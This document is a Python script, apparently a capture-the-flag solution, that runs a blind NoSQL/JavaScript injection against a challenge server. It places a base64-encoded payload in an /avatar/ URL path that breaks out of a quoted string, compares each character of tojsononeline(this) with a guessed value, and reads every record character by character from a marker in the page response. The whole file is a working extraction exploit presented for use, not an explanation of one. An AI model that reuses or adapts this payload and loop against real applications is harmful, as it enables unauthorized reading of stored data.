#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import urllib
import requests
from time import sleep
import base64

user_agent = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.6) Gecko/20071008 Ubuntu/7.10 (gutsy) Firefox/2.0.0.6'
headers = { 'User-Agent' : user_agent, 'Connection': 'keep-alive'}

length = 1024

string_true = '/imgs/mojo'
string_error = 'Error with SQL query'

dic = ' \"etaoinsrhldcumfpgwybvkxjqz[]().:_ETAOINSRHLDCUMFPGWYBVKXJQZ0123456789{}/\\~-?,\n\t'

def execute():
	result = ''

	for i in range(length):
		kount = 0
		for letter in dic:
			kount += 1

			n = ord(letter)
			if letter != '\n':
				sys.stdout.write(letter)
			else:
				sys.stdout.write(' ')
			sys.stdout.flush()

			#url = 'http://challenges.ka0labs.org:31337/avatar/'+ base64.b64encode(urllib.unquote('%22;tojsononeline(this)['+str(i)+']==String.fromCharCode('+str(n)+');%00'))
			url = 'http://challenges.ka0labs.org:31337/avatar/'+ base64.b64encode(urllib.unquote('%22;tojsononeline(this).toString()['+str(i)+']==String.fromCharCode('+str(n)+');%00'))

			while True:
				try:
					r = requests.get(url, headers=headers, allow_redirects=False)
					data = r.text
				except:
					print("\n[+] Request Error! ")
					try:
						sleep(1)
					except:
						return result
					continue
				break

			if string_error in data:
				print(data)
				print("\nERROR")
				sys.exit()
				continue

			elif string_true in data:
				result = result + letter
				break

			else:
				sys.stdout.write('\b')

				if kount == len(dic):
					sys.stdout.write(' \n')
					sys.stdout.flush()
					return result
					break
				continue

	return result


result = execute()
print('\n'+ str(result)+'\n')
